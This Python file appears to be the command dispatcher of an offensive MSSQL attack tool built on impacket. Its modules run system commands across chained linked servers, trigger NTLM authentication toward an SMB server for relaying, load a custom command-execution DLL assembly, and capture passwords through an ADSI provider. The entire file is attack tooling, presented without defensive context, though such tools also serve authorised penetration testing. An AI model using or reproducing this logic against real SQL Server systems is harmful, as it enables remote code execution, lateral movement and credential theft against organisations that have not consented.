import os
from impacket import LOG


def execute_module(options, mssql_client):
    link_server = options.link_server if options.link_server else mssql_client.state['local_hostname']
    if options.chain_id:
        if not mssql_client.is_valid_chain_id():
            return False
        link_server = list(mssql_client.retrieve_link_server_from_chain_id(options.chain_id).keys())[0]

    elif not mssql_client.is_valid_link_server(link_server):
        return False

    if options.module == "enumerate":
        return True

    elif options.module == 'exec':
        mssql_client.procedure_chain_builder(mssql_client.execute_procedure,
                                             [options.command_execution_method, options.command],
                                             linked_server=link_server)
    elif options.module == 'ntlm-relay':
        mssql_client.procedure_chain_builder(mssql_client.execute_procedure,
                                             [options.relay_method, options.smb_server],
                                             linked_server=link_server)

    elif options.module == 'custom-asm':
        arch_name = mssql_client.detect_architecture(link_server, options)
        if not arch_name:
            LOG.error(f"Failed to detect the architecture of {link_server}")
            return False
        asm_filename = "CmdExec-x64.dll" if arch_name == 'x64' else "CmdExec-x86.dll"
        file_location = os.path.join("playbooks/custom-asm", asm_filename)
        mssql_client.procedure_chain_builder(mssql_client.execute_custom_assembly_procedure,
                                             [file_location, options.procedure_name, options.command, "CalcAsm"],
                                             linked_server=link_server)

    elif options.module == 'direct_query':
        mssql_client.procedure_chain_builder(mssql_client.direct_query,
                                             [options.query],
                                             linked_server=link_server, method=options.method)

    elif options.module == 'retrieve-password':
        mssql_client.retrieve_password(link_server, options.listen_port, options.adsi_provider)
    elif options.module == 'get-chain-list':
        mssql_client.get_chain_list()
    elif options.module == 'get-link-server-list':
        mssql_client.get_linked_server_list()

    return True
